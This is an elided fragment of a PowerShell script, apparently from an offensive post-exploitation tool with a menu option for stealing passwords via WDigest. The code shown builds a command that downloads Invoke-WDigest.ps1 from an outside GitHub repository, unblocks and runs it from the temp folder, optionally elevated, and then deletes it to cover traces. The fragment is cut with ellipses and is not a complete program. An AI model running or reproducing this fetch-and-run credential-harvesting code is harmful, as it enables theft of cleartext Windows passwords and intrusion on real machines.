...
"@;Write-Host $AnwsomeBanner
      ...
      If($choise -ieq "Passwords" -or $choise -ieq "pass")
      {
        ...
        If($pass_choise -ieq "WDigest")
        {
           ...
           {
              $Command = "iwr -uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/DeviceGuard/Invoke-WDigest.ps1`" -OutFile `"`$Env:TMP\Invoke-WDigest.ps1`"|Unblock-File;powershell -File `"`$Env:TMP\Invoke-WDigest.ps1`" -banner 'false' -wdigest 'true' -GetCounterMeasures 'false' -manycats;Remove-Item -Path `"`$Env:TMP\Invoke-WDigest.ps1`" -Force";
           }
           Else
           {
              $Command = "iwr -uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/DeviceGuard/Invoke-WDigest.ps1`" -OutFile `"`$Env:TMP\Invoke-WDigest.ps1`"|Unblock-File;powershell -File `"`$Env:TMP\Invoke-WDigest.ps1`" -banner 'false' -wdigest 'true' -GetCounterMeasures 'false' -manycats -runas;Remove-Item -Path `"`$Env:TMP\Invoke-WDigest.ps1`" -Force";
           }
        }
